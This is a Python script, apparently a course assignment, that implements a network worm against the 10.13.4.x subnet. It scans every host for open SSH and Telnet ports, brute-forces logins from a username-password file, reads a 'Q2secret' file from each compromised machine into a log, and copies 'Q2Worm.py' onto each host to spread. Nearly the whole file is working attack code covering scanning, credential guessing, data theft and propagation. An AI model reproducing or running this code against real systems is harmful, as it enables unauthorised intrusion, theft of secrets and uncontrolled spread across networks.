import socket
import paramiko
import telnetlib

def find_vulnerable_machines():
    ssh_ips = []
    telnet_ips = []
    
    for i in range(256): 
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1) 
        
        ip_str = "10.13.4." + str(i)
        print(f"checking {ip_str}")
        
        if sock.connect_ex((ip_str, 22)) == 0 :
            ssh_ips.append(ip_str)
            print(f"ssh port open @{ip_str}")
            
        sock.close()
            
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1) 
            
        if sock.connect_ex((ip_str, 23)) == 0:
            telnet_ips.append(ip_str)
            print(f"telnet port open @{ip_str}")
            
        sock.close()

    with open("open_ssh.log", "w") as ssh_log:
        ssh_log.write("\n".join(ssh_ips))

    with open("open_telnet.log", "w") as telnet_log:
        telnet_log.write("\n".join(telnet_ips))
    
    print(f"Scan complete. Found {len(ssh_ips)} machines with SSH and {len(telnet_ips)} machines with Telnet.")
    
def test_ssh_login(ip, user, password):
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # attempt connection and catch errors
    try:
        client.connect(ip, username=user, password=password, timeout=5)
        client.close()
        print(f"Valid credentials: {user}@{ip}")
        return True
    except paramiko.AuthenticationException:
        print(f"Authentication failed for {user}@{ip}")
    except paramiko.SSHException as e:
        print(f"SSH error for {ip}: {e}")
    except paramiko.ssh_exception.SSHException as e:
        print(f"SSH error for {ip}: {e}")
    except Exception as e:
        print(f"Unexpected error for {ip}: {e}")
    finally:
        client.close()
    return False

def test_telnet_login(ip, user, password):
    print(f"Trying Telnet login: {user}@{ip}")
    telnet = telnetlib.Telnet(ip, timeout=10)  

    prompt = telnet.read_until(b"login:", timeout=10)
    telnet.write(user.encode('ascii') + b"\n")
    prompt = telnet.read_until(b"Password:", timeout=10)
    telnet.write(password.encode('ascii') + b"\n")
    text = telnet.read_until(b"\n", timeout=10)
    index, match, text = telnet.expect([b"Login incorrect"], timeout=10)

    # inverted logic here because it wasn't working the other way for some reason.
    # login is incorrect
    if index >= 0:
        print(f"Invalid login for {user}@{ip}")
        telnet.write(b"exit\n")
        telnet.close()
        return False
    
    # login is correct
    else:
        print(f"Valid Telnet credentials: {user}@{ip}")
        telnet.write(b"exit\n")
        telnet.close()
        return True
    
def find_vulnerable_accounts():
    # use passwords from ../Q2pwd and tests them with ips in open_ssh.log and ips in open_telnet.log
    ssh_ips = []
    telnet_ips = []
    user_passes = []
    
    # obtain ssh ips 
    with open("open_ssh.log", 'r') as ssh_log:
        for line in ssh_log:
            ssh_ips.append(line.strip("\n"))
            
    # obtain telnet ips
    with open("open_telnet.log", 'r') as telnet_log:
        for line in telnet_log:
            telnet_ips.append(line.strip("\n"))
            
    # obtain username password pairs
    with open("../../Q2pwd", 'r') as user_pass_log:
        for line in user_pass_log:
            user_passes.append(line.strip("\n").split(" "))
            
    # test every password against every ssh ip
    for ssh_ip in ssh_ips:
        for user_pass in user_passes:
            print(f"{ssh_ip} {user_pass[0]} {user_pass[1]}")
            if test_ssh_login(ssh_ip, user_pass[0], user_pass[1]):
                print(f"Successful: {ssh_ip} {user_pass[0]} {user_pass[1]}")
                with open('ssh_accounts.log', 'a') as ssh_log:
                    ssh_log.write(f"{ssh_ip},{user_pass[0]},{user_pass[1]}\n")
                
    # test every password against every telnet ip
    for telnet_ip in telnet_ips:
        for user_pass in user_passes:
            print(f"{telnet_ip} {user_pass[0]} {user_pass[1]}")
            if test_telnet_login(telnet_ip, user_pass[0], user_pass[1]):
                print(f"Successful {telnet_ip} {user_pass[0]} {user_pass[1]}")
                with open('telnet_accounts.log', 'a') as telnet_log:
                    telnet_log.write(f"{telnet_ip},{user_pass[0]},{user_pass[1]}\n")
        
def read_ssh_from_remote(ip, username, password, file_path):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=username, password=password)

    # read file
    sftp = client.open_sftp()
    with sftp.open(file_path, 'r') as remote_file:
        read_in = remote_file.read().decode('utf-8').strip()

    return read_in

def copy_file_ssh(ip, username, password, local_file, remote_file_path):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=username, password=password)

    sftp = client.open_sftp()
    sftp.put(local_file, remote_file_path)
    
    sftp.close()
    client.close()

def read_file_from_telnet(ip, user, password, file_path):
    telnet = telnetlib.Telnet(ip, timeout=5)

    telnet.read_until(b"login: ", timeout=5)
    telnet.write(user.encode('ascii') + b"\n")

    telnet.read_until(b"Password: ", timeout=5)
    telnet.write(password.encode('ascii') + b"\n")

    telnet.read_until(b"$", timeout=5) 

    command = f"cat {file_path}\n"
    telnet.write(command.encode('ascii'))

    file_content = telnet.read_until(b"$", timeout=5).decode('ascii') 
    
    # clean up weird byte code
    clean_content = file_content.split('\n', 1)[-1] 
    clean_content = clean_content.replace("\r", "").strip()
    
    clean_content = clean_content.rstrip('$').strip()
    
    telnet.write(b"exit\n")
    telnet.close()

    return clean_content

def copy_file_telnet(ip, username, password, local_file_path, remote_file_path):
    with open(local_file_path, 'r') as local_file:
        file_content = local_file.read()

    # Connect to the remote machine via Telnet
    telnet = telnetlib.Telnet(ip)
    telnet.read_until(b"login: ")
    telnet.write(username.encode('ascii') + b"\n")
    telnet.read_until(b"Password: ")
    telnet.write(password.encode('ascii') + b"\n")

    telnet.read_until(b"$", timeout=5)  # Wait for prompt

    # Delete the old file if it exists
    telnet.write(f"rm -f {remote_file_path}\n".encode('ascii'))
    telnet.read_until(b"$", timeout=5)  # Ensure the command finishes before proceeding

    # Use echo to write the file content on the remote machine
    for line in file_content.splitlines():
        telnet.write(f"echo '{line}' >> {remote_file_path}\n".encode('ascii'))
        telnet.read_until(b"$", timeout=5)

    print(f"Successfully copied file to {remote_file_path} on {ip}")

    telnet.write(b"exit\n")
    telnet.close()
               
def extract_and_infect():
    # get text in Q2secret and put in extracted_secrets.log in the format ip,user,secret
    ssh_accounts = []
    telnet_accounts = []
    
    with open('ssh_accounts.log', 'r') as file:
        for line in file:
            ssh_accounts.append(line.strip("\n").split(","))
            
    with open('telnet_accounts.log', 'r') as file:
        for line in file:
            telnet_accounts.append(line.strip("\n").split(","))
            
    for account in ssh_accounts:
        ip, username, password = account
        print(f"ip:{ip} user:{username} pass:{password}")
        with open('extracted_secrets.log', 'a') as out:
            out.write(f"{read_ssh_from_remote(ip, username, password, 'Q2secret')}\n")
        copy_file_ssh(ip, username, password, 'Q2Worm.py', f'/home/{username}/Q2Worm.py')
            
    for account in telnet_accounts:
        ip, username, password = account
        print(f"ip:{ip} user:{username} pass:{password}")
        with open('extracted_secrets.log', 'a') as out:
            out.write(f"{read_file_from_telnet(ip, username, password, 'Q2secret')}\n")
        copy_file_telnet(ip, username, password, 'Q2Worm.py', f'/home/{username}/Q2Worm.py')

if __name__ == '__main__':
    find_vulnerable_machines()
    find_vulnerable_accounts()
    extract_and_infect()
